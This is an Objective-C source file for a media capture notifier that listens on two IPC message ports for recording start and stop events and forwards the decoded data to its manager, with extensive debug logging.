//
//  MediaCaptureNotifier.m
//  MediaCaptureManager
//
//  Created by Makara Khloth on 3/7/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MediaCaptureNotifier.h"
#import "MediaCaptureManager.h"
#import "DefStd.h"

@interface MediaCaptureNotifier (private)

- (void) main;

@end

@implementation MediaCaptureNotifier

@synthesize mMediaCaptureManager;

- (id) initWithMediaCaptureManager: (MediaCaptureManager *) aMediaCaptureManager {
	if ((self = [super init])) {
		mMediaCaptureManager = aMediaCaptureManager;
		mThisThread = [NSThread currentThread];
		
		mNotiIdentifier = 0;
	}
	return (self);
}

- (void) startMonitorMediaCapture {
	[NSThread detachNewThreadSelector:@selector(main) toTarget:self withObject:nil];
}

- (void) stopMonitorMediaCapture {
	// Stop run loop of notifier thread
	if (mMediaNotifierRunLoop) {
		DLog(@"---------- Stop run loop of media notifier thread")
		CFRunLoopRef runLoop = [mMediaNotifierRunLoop getCFRunLoop];
		CFRunLoopStop(runLoop);
	}
	mMediaNotifierRunLoop = nil;
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	// for logging purpose
	NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
	[formatter setDateFormat:@"HH:mm:ss:SSSS"];
	DLog (@"RECEIVE in notifier %f", [[NSDate date] timeIntervalSince1970]);		// NSTimeInterval
	DLog (@"RECEIVE in notifier: %@", [formatter stringFromDate:[NSDate date]]);	// formatted time
	
	// create notification object for logging purpose
	// 1) id
	// 2) timestamp (NSTimeInterval)
	// 3) timestamp (formatted time)
	// 3) data
	
    mNotiIdentifier++;
	NSNumber *numIdentifier = [NSNumber numberWithInteger:mNotiIdentifier];			// id
	DLog(@"============= NOTIFICATION IDENTIFIER %@ =============", numIdentifier)
	
	NSTimeInterval timestamp = [[NSDate date] timeIntervalSince1970];				// timestamp (NSTimeInterval)
	DLog(@"============= TIMESTAMP =============%f", timestamp);
	
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"HH:mm:ss:SSS"];
	
	NSString *formattedDateString = [dateFormatter stringFromDate:[NSDate date]];	// timestamp (formatted time)
	DLog(@"============= TIMESTAMP =============%@", formattedDateString);
	
	NSDictionary *userInfo = [NSDictionary dictionaryWithObjectsAndKeys:numIdentifier,							NOTIFICATION_ID_KEY,
																		[NSNumber numberWithDouble:timestamp],	INTERVAL_TIMESTAMP_KEY,
																		formattedDateString,					FORMATTED_TIMESTAMP_KEY,
																		[NSData dataWithData:aRawData],			DATA_KEY, 
																		nil];
	NSNotification *notification = [[NSNotification notificationWithName:@"MediaDidReceiveFromPortNotification" 
																 object:self 
															   userInfo:userInfo] retain];
	
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *mediaDictionary = [[unarchiver decodeObjectForKey:kMediaMonitorKey]retain];
	[unarchiver finishDecoding];
	[unarchiver release];
	NSNumber *mediaEvent = [mediaDictionary objectForKey:kMediaNotification];
	
	if ([mediaEvent intValue] == 1) {	// STOP RECORD
		[[self mMediaCaptureManager] setMMediaIsCapturing:NO];
		
		[[self mMediaCaptureManager] setMMediaNotificationCount:([[self mMediaCaptureManager] mMediaNotificationCount] + 1)];
		DLog(@"++++++++++++ Notifier-notfCount = %d", [[self mMediaCaptureManager] mMediaNotificationCount])

		[[self mMediaCaptureManager] performSelector:@selector(processDataFromMessagePort:)
											onThread:mThisThread
										  withObject:notification
									   waitUntilDone:NO];
		
	} else {							// START RECORD
		DLog(@"!!!!!!!!!!!!! NOTIFIER is signaled for RECORDING")
		[[self mMediaCaptureManager] setMMediaIsCapturing:YES];		
	}
	
	[mediaDictionary release];
	[dateFormatter release];
	[notification autorelease];
	[formatter release];
}

- (void) main {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	DLog (@"Now this log is in media notifier thread------")
	mMediaNotifierRunLoop = [NSRunLoop currentRunLoop];
	@try {
		MessagePortIPCReader *messagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kMediaPort1 withMessagePortIPCDelegate:self];
		[messagePortReader1 start];
		MessagePortIPCReader *messagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kMediaPort2 withMessagePortIPCDelegate:self];
		[messagePortReader2 start];
		CFRunLoopRun();
		[messagePortReader1 release];
		[messagePortReader2 release];
	}
	@catch (NSException * e) {
		;
	}
	@finally {
		;
	}
	DLog (@"Now this log is in media notifier thread before thread is completely exit ------")
	[pool release];
}

- (void) dealloc {
	DLog (@"Media capture notifier is dealloc ---------------------");
	[super dealloc];
}

@end
